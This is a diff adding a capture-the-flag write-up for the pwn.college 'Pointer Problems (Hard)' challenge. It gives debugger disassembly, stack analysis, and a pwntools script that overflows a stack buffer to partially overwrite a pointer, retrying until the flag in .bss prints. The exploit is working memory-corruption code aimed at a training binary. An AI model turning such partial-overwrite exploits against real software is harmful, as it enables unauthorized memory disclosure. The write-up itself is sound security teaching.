@@ -3507,51 +3507,398 @@ $
 
 ## Pointer Problems (Hard)
 
+> Leverage memory corruption to leak the flag.
+
+```
+hacker@program-security~pointer-problems-hard:/$ /challenge/pointer-problems-hard 
+In this level, the flag will be loaded into the bss section of memory.
+However, at no point will this program actually print the buffer storing the flag.
+Reading flag into memory
+Payload size: 
+```
+
+We need the following:
+- [ ] Location of buffer
+- [ ] Location of `char*` to array
+- [ ] Offset of the flag
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x00000000000010d0  __cxa_finalize@plt
+0x00000000000010e0  __errno_location@plt
+0x00000000000010f0  puts@plt
+0x0000000000001100  __stack_chk_fail@plt
+0x0000000000001110  printf@plt
+0x0000000000001120  read@plt
+0x0000000000001130  setvbuf@plt
+0x0000000000001140  open@plt
+0x0000000000001150  __isoc99_scanf@plt
+0x0000000000001160  exit@plt
+0x0000000000001170  strerror@plt
+0x0000000000001180  _start
+0x00000000000011b0  deregister_tm_clones
+0x00000000000011e0  register_tm_clones
+0x0000000000001220  __do_global_dtors_aux
+0x0000000000001260  frame_dummy
+0x0000000000001269  bin_padding
+0x0000000000001ef8  challenge
+0x00000000000020d2  main
+0x0000000000002190  __libc_csu_init
+0x0000000000002200  __libc_csu_fini
+0x0000000000002208  _fini
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000001ef8 <+0>:     endbr64
+   0x0000000000001efc <+4>:     push   rbp
+   0x0000000000001efd <+5>:     mov    rbp,rsp
+   0x0000000000001f00 <+8>:     sub    rsp,0xd0
+   0x0000000000001f07 <+15>:    mov    DWORD PTR [rbp-0xb4],edi
+   0x0000000000001f0d <+21>:    mov    QWORD PTR [rbp-0xc0],rsi
+   0x0000000000001f14 <+28>:    mov    QWORD PTR [rbp-0xc8],rdx
+   0x0000000000001f1b <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000001f24 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001f28 <+48>:    xor    eax,eax
+   0x0000000000001f2a <+50>:    lea    rdx,[rbp-0x90]
+   0x0000000000001f31 <+57>:    mov    eax,0x0
+   0x0000000000001f36 <+62>:    mov    ecx,0x11
+   0x0000000000001f3b <+67>:    mov    rdi,rdx
+   0x0000000000001f3e <+70>:    rep stos QWORD PTR es:[rdi],rax
+   0x0000000000001f41 <+73>:    lea    rax,[rip+0x30f8]        # 0x5040 <bssdata>
+   0x0000000000001f48 <+80>:    mov    QWORD PTR [rbp-0x98],rax
+   0x0000000000001f4f <+87>:    lea    rax,[rip+0x3262]        # 0x51b8 <bssdata+376>
+   0x0000000000001f56 <+94>:    mov    QWORD PTR [rbp-0x10],rax
+   0x0000000000001f5a <+98>:    movabs rax,0x2073692073696854
+   0x0000000000001f64 <+108>:   movabs rdx,0x676e697274732061
+   0x0000000000001f6e <+118>:   mov    QWORD PTR [rip+0x3243],rax        # 0x51b8 <bssdata+376>
+   0x0000000000001f75 <+125>:   mov    QWORD PTR [rip+0x3244],rdx        # 0x51c0 <bssdata+384>
+   0x0000000000001f7c <+132>:   movabs rax,0x20656874206e6920
+   0x0000000000001f86 <+142>:   mov    QWORD PTR [rip+0x323b],rax        # 0x51c8 <bssdata+392>
+   0x0000000000001f8d <+149>:   mov    DWORD PTR [rip+0x3239],0x21737362        # 0x51d0 <bssdata+400>
+   0x0000000000001f97 <+159>:   mov    BYTE PTR [rip+0x3236],0x0        # 0x51d4 <bssdata+404>
+   0x0000000000001f9e <+166>:   lea    rdi,[rip+0x1063]        # 0x3008
+   0x0000000000001fa5 <+173>:   call   0x10f0 <puts@plt>
+   0x0000000000001faa <+178>:   lea    rdi,[rip+0x109f]        # 0x3050
+   0x0000000000001fb1 <+185>:   call   0x10f0 <puts@plt>
+   0x0000000000001fb6 <+190>:   lea    rdi,[rip+0x10e6]        # 0x30a3
+   0x0000000000001fbd <+197>:   call   0x10f0 <puts@plt>
+   0x0000000000001fc2 <+202>:   mov    esi,0x0
+   0x0000000000001fc7 <+207>:   lea    rdi,[rip+0x10f1]        # 0x30bf
+   0x0000000000001fce <+214>:   mov    eax,0x0
+   0x0000000000001fd3 <+219>:   call   0x1140 <open@plt>
+   0x0000000000001fd8 <+224>:   mov    edx,0x100
+   0x0000000000001fdd <+229>:   lea    rsi,[rip+0x305c]        # 0x5040 <bssdata>
+   0x0000000000001fe4 <+236>:   mov    edi,eax
+   0x0000000000001fe6 <+238>:   call   0x1120 <read@plt>
+   0x0000000000001feb <+243>:   mov    QWORD PTR [rbp-0xa0],0x0
+   0x0000000000001ff6 <+254>:   lea    rdi,[rip+0x10c8]        # 0x30c5
+   0x0000000000001ffd <+261>:   mov    eax,0x0
+   0x0000000000002002 <+266>:   call   0x1110 <printf@plt>
+   0x0000000000002007 <+271>:   lea    rax,[rbp-0xa0]
+   0x000000000000200e <+278>:   mov    rsi,rax
+   0x0000000000002011 <+281>:   lea    rdi,[rip+0x10bc]        # 0x30d4
+   0x0000000000002018 <+288>:   mov    eax,0x0
+   0x000000000000201d <+293>:   call   0x1150 <__isoc99_scanf@plt>
+   0x0000000000002022 <+298>:   mov    rax,QWORD PTR [rbp-0xa0]
+   0x0000000000002029 <+305>:   mov    rsi,rax
+   0x000000000000202c <+308>:   lea    rdi,[rip+0x10a5]        # 0x30d8
+   0x0000000000002033 <+315>:   mov    eax,0x0
+   0x0000000000002038 <+320>:   call   0x1110 <printf@plt>
+   0x000000000000203d <+325>:   mov    rdx,QWORD PTR [rbp-0xa0]
+   0x0000000000002044 <+332>:   lea    rax,[rbp-0x90]
+   0x000000000000204b <+339>:   mov    rsi,rax
+   0x000000000000204e <+342>:   mov    edi,0x0
+   0x0000000000002053 <+347>:   call   0x1120 <read@plt>
+   0x0000000000002058 <+352>:   mov    DWORD PTR [rbp-0xa4],eax
+   0x000000000000205e <+358>:   cmp    DWORD PTR [rbp-0xa4],0x0
+   0x0000000000002065 <+365>:   jns    0x2093 <challenge+411>
+   0x0000000000002067 <+367>:   call   0x10e0 <__errno_location@plt>
+   0x000000000000206c <+372>:   mov    eax,DWORD PTR [rax]
+   0x000000000000206e <+374>:   mov    edi,eax
+   0x0000000000002070 <+376>:   call   0x1170 <strerror@plt>
+   0x0000000000002075 <+381>:   mov    rsi,rax
+   0x0000000000002078 <+384>:   lea    rdi,[rip+0x1081]        # 0x3100
+   0x000000000000207f <+391>:   mov    eax,0x0
+   0x0000000000002084 <+396>:   call   0x1110 <printf@plt>
+   0x0000000000002089 <+401>:   mov    edi,0x1
+   0x000000000000208e <+406>:   call   0x1160 <exit@plt>
+   0x0000000000002093 <+411>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000002097 <+415>:   mov    rsi,rax
+   0x000000000000209a <+418>:   lea    rdi,[rip+0x1087]        # 0x3128
+   0x00000000000020a1 <+425>:   mov    eax,0x0
+   0x00000000000020a6 <+430>:   call   0x1110 <printf@plt>
+   0x00000000000020ab <+435>:   lea    rdi,[rip+0x1096]        # 0x3148
+   0x00000000000020b2 <+442>:   call   0x10f0 <puts@plt>
+   0x00000000000020b7 <+447>:   mov    eax,0x0
+   0x00000000000020bc <+452>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x00000000000020c0 <+456>:   xor    rcx,QWORD PTR fs:0x28
+   0x00000000000020c9 <+465>:   je     0x20d0 <challenge+472>
+   0x00000000000020cb <+467>:   call   0x1100 <__stack_chk_fail@plt>
+   0x00000000000020d0 <+472>:   leave
+   0x00000000000020d1 <+473>:   ret
+End of assembler dump.
+```
+
+Immediately we can see that the `open@plt` and `read@plt` are being chained in such a way which denotes the opening and reading of the `/flag` file's contents.
+We can see that the flag is read at an offset of `0x5040` which falls in the `.bss` section.
+
+```
+# ---- snip ----
+
+   0x0000000000001fd8 <+224>:   mov    edx,0x100
+   0x0000000000001fdd <+229>:   lea    rsi,[rip+0x305c]        # 0x5040 <bssdata>
+   0x0000000000001fe4 <+236>:   mov    edi,eax
+   0x0000000000001fe6 <+238>:   call   0x1120 <read@plt>
+
+# ---- snip ----
+```
+
+- [ ] Location of buffer
+- [ ] Location of `char*` to array
+- [x] Offset of the flag: `0x5040`
+
+There is a `read@plt` happening at `challenge+347`.
+Let's put a breakpoint and run the program.
+
+347 411
+
+```
+pwndbg> break *(challenge+347)
+Breakpoint 1 at 0x2053
+```
+
+```
+pwndbg> run
+Starting program: /challenge/pointer-problems-hard 
+In this level, the flag will be loaded into the bss section of memory.
+However, at no point will this program actually print the buffer storing the flag.
+Reading flag into memory...
+Payload size: 10
+Send your payload (up to 10 bytes)!
+
+Breakpoint 1, 0x00006133f8e3d053 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffec3de8700 ◂— 0
+ RBX  0x6133f8e3d190 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0xa
+ RDI  0
+ RSI  0x7ffec3de8700 ◂— 0
+ R8   0x24
+ R9   0x24
+ R10  0x6133f8e3e0f4 ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x6133f8e3c180 (_start) ◂— endbr64 
+ R13  0x7ffec3de98c0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffec3de8790 —▸ 0x7ffec3de97d0 ◂— 0
+ RSP  0x7ffec3de86c0 ◂— 8
+ RIP  0x6133f8e3d053 (challenge+347) ◂— call read@plt
+─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x6133f8e3d053 <challenge+347>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffec3de8700 ◂— 0
+        nbytes: 0xa
+ 
+   0x6133f8e3d058 <challenge+352>    mov    dword ptr [rbp - 0xa4], eax
+   0x6133f8e3d05e <challenge+358>    cmp    dword ptr [rbp - 0xa4], 0
+   0x6133f8e3d065 <challenge+365>    jns    challenge+411               <challenge+411>
+ 
+   0x6133f8e3d067 <challenge+367>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x6133f8e3d06c <challenge+372>    mov    eax, dword ptr [rax]
+   0x6133f8e3d06e <challenge+374>    mov    edi, eax
+   0x6133f8e3d070 <challenge+376>    call   strerror@plt                <strerror@plt>
+ 
+   0x6133f8e3d075 <challenge+381>    mov    rsi, rax
+   0x6133f8e3d078 <challenge+384>    lea    rdi, [rip + 0x1081]     RDI => 0x6133f8e3e100 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x6133f8e3d07f <challenge+391>    mov    eax, 0                  EAX => 0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffec3de86c0 ◂— 8
+01:0008│-0c8 0x7ffec3de86c8 —▸ 0x7ffec3de98d8 —▸ 0x7ffec3dea692 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0c0 0x7ffec3de86d0 —▸ 0x7ffec3de98c8 —▸ 0x7ffec3dea671 ◂— '/challenge/pointer-problems-hard'
+03:0018│-0b8 0x7ffec3de86d8 ◂— 0x1001be6a0
+04:0020│-0b0 0x7ffec3de86e0 ◂— 0x1be6a0
+05:0028│-0a8 0x7ffec3de86e8 ◂— 0x1c
+06:0030│-0a0 0x7ffec3de86f0 ◂— 0xa /* '\n' */
+07:0038│-098 0x7ffec3de86f8 —▸ 0x6133f8e40040 (bssdata) ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x6133f8e3d053 challenge+347
+   1   0x6133f8e3d167 main+149
+   2   0x7f2bf2060083 __libc_start_main+243
+   3   0x6133f8e3c1ae _start+46
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffec3de8700`
+- [ ] Location of `char*` to array
+- [x] Offset of the flag: `0x5040`
+
+There is a call to `printf@plt` made at `challenge+430`.
+
+```
+# ---- snip ----
+
+   0x0000000000002093 <+411>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000002097 <+415>:   mov    rsi,rax
+   0x000000000000209a <+418>:   lea    rdi,[rip+0x1087]        # 0x3128
+   0x00000000000020a1 <+425>:   mov    eax,0x0
+   0x00000000000020a6 <+430>:   call   0x1110 <printf@plt>
+
+# ---- snip ----
+```
+
+We know that the argument which is placed in `rsi` is the string on the stack. This argument is moved in `rsi` from `rax` into which it is moved from `[rbp-0x10]`. 
+This tells us that the `char*` is at `rbp-0x10`. Lets set a breakpoint and continue.
+
+```
+pwndbg> break *(challenge+411)
+Breakpoint 2 at 0x2093
+```
+
+```
+pwndbg> c
+Continuing.
+aaaa
+
+Breakpoint 2, 0x00006133f8e3d093 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
+*RAX  5
+ RBX  0x6133f8e3d190 (__libc_csu_init) ◂— endbr64 
+*RCX  0x7f2bf214a1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0xa
+ RDI  0
+ RSI  0x7ffec3de8700 ◂— 0xa61616161 /* 'aaaa\n' */
+ R8   0x24
+ R9   0x24
+ R10  0x6133f8e3e0f4 ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x6133f8e3c180 (_start) ◂— endbr64 
+ R13  0x7ffec3de98c0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffec3de8790 —▸ 0x7ffec3de97d0 ◂— 0
+ RSP  0x7ffec3de86c0 ◂— 8
+*RIP  0x6133f8e3d093 (challenge+411) ◂— mov rax, qword ptr [rbp - 0x10]
+─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x6133f8e3d093 <challenge+411>    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7ffec3de8780] => 0x6133f8e401b8 (bssdata+376) ◂— 'This is a string in the bss!'
+   0x6133f8e3d097 <challenge+415>    mov    rsi, rax                        RSI => 0x6133f8e401b8 (bssdata+376) ◂— 'This is a string in the bss!'
+   0x6133f8e3d09a <challenge+418>    lea    rdi, [rip + 0x1087]             RDI => 0x6133f8e3e128 ◂— 'The string on the stack is: %s\n'
+   0x6133f8e3d0a1 <challenge+425>    mov    eax, 0                          EAX => 0
+   0x6133f8e3d0a6 <challenge+430>    call   printf@plt                  <printf@plt>
+ 
+   0x6133f8e3d0ab <challenge+435>    lea    rdi, [rip + 0x1096]     RDI => 0x6133f8e3e148 ◂— 'Goodbye!'
+   0x6133f8e3d0b2 <challenge+442>    call   puts@plt                    <puts@plt>
+ 
+   0x6133f8e3d0b7 <challenge+447>    mov    eax, 0                       EAX => 0
+   0x6133f8e3d0bc <challenge+452>    mov    rcx, qword ptr [rbp - 8]
+   0x6133f8e3d0c0 <challenge+456>    xor    rcx, qword ptr fs:[0x28]
+   0x6133f8e3d0c9 <challenge+465>    je     challenge+472               <challenge+472>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffec3de86c0 ◂— 8
+01:0008│-0c8 0x7ffec3de86c8 —▸ 0x7ffec3de98d8 —▸ 0x7ffec3dea692 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0c0 0x7ffec3de86d0 —▸ 0x7ffec3de98c8 —▸ 0x7ffec3dea671 ◂— '/challenge/pointer-problems-hard'
+03:0018│-0b8 0x7ffec3de86d8 ◂— 0x1001be6a0
+04:0020│-0b0 0x7ffec3de86e0 ◂— 0x1be6a0
+05:0028│-0a8 0x7ffec3de86e8 ◂— 0x50000001c
+06:0030│-0a0 0x7ffec3de86f0 ◂— 0xa /* '\n' */
+07:0038│-098 0x7ffec3de86f8 —▸ 0x6133f8e40040 (bssdata) ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x6133f8e3d093 challenge+411
+   1   0x6133f8e3d167 main+149
+   2   0x7f2bf2060083 __libc_start_main+243
+   3   0x6133f8e3c1ae _start+46
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffec3de8700`
+- [x] Location of `char*` to array: `0x7ffec3de8780`
+- [x] Offset of the flag: `0x5040`
+
+
+### Exploit
+
 ```py
 from pwn import *
 import re
 
-p = process('/challenge/pointer-problems-easy')
+attempt = 0
 
-output = p.recvuntil(b'Payload size:')
+while True:
+    p = process('/challenge/pointer-problems-hard')
 
-# Read /proc/<pid>/maps to find BSS start
-maps = open(f"/proc/{p.pid}/maps").read()
-for line in maps.splitlines():
-    if "bss" in line:
-        bss_start = int(line.split("-")[0], 16)
-        log.success(f".bss starts at: {hex(bss_start)}")
-        break
+    output = p.recvuntil(b'Payload size:')
 
-# input buffer base
-buffer_addr = int(re.search(rb'input buffer begins at (0x[0-9a-fA-F]+)', output).group(1), 16)
-# the target char* pointer on stack
-char_ptr_addr = int(re.search(rb'The char\* is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
-# the flag's address in the bss
-flag_addr = int(re.search(rb'The flag\s+is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
+    # input buffer base
+    buffer_addr = 0x7ffec3de8700
+    # the target char* pointer on stack
+    char_ptr_addr = 0x7ffec3de8780
+    # the flag's address in the bss
+    flag_offset = 0x5040
 
-# Calculate offset & payload_size
-offset = char_ptr_addr - buffer_addr
-payload_size = offset + 8
+    # Calculate offset & payload_size
+    offset = char_ptr_addr - buffer_addr
+    payload_size = offset + 2
 
-# Log info
-log.success(f"Input Buffer     @ {hex(buffer_addr)}")
-log.success(f"Pointer          @ {hex(char_ptr_addr)}")
-log.success(f"Flag Addr        @ {hex(flag_addr)}")
-log.success(f"Offset:            {offset} bytes")
+    # Build payload
+    payload = b"A" * offset
+    payload += struct.pack("<H", flag_offset)
 
-# Build payload
-payload = b"A" * offset
-payload += p64(flag_addr)
+    attempt += 1
+    print(f"[+] Attempt {attempt}")
 
-# Send payload size (this is what's actually asked for now)
-p.sendline(str(payload_size))
+    try:
+        p.sendline(str(payload_size))
 
-# Send payload
-p.recvuntil(b'Send your payload')
-p.send(payload)
+        # Send payload
+        p.recvuntil(b'Send your payload')
+        p.send(payload)
+        output = p.recvall(timeout=1).decode(errors="ignore")
 
-p.interactive() 
+        if "pwn.college{" in output:
+            print("[!!!] FLAG FOUND !!!")
+            print(output)
+            break
+
+    except Exception:
+        pass
+    finally:
+        p.close()
+```
+
+```
+hacker@program-security~pointer-problems-hard:/$ python ~/script.py 
+[+] Starting local process '/challenge/pointer-problems-hard': pid 17798
+[+] Attempt 1
+/home/hacker/script.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(payload_size))
+[+] Receiving all data: Done (72B)
+[*] Process '/challenge/pointer-problems-hard' stopped with exit code 0 (pid 17798)
+[+] Starting local process '/challenge/pointer-problems-hard': pid 17801
+
+# ---- snip ----
+
+[+] Attempt 37
+[+] Receiving all data: Done (118B)
+[*] Process '/challenge/pointer-problems-hard' stopped with exit code 0 (pid 17912)
+[!!!] FLAG FOUND !!!
+ (up to 130 bytes)!
+The string on the stack is: pwn.college{AWPL7LqV37TqZ51Fg7upWPoZuEI.QXzgzN4EDL4ITM0EzW}
+
+Goodbye!
 ```
 
 &nbsp;
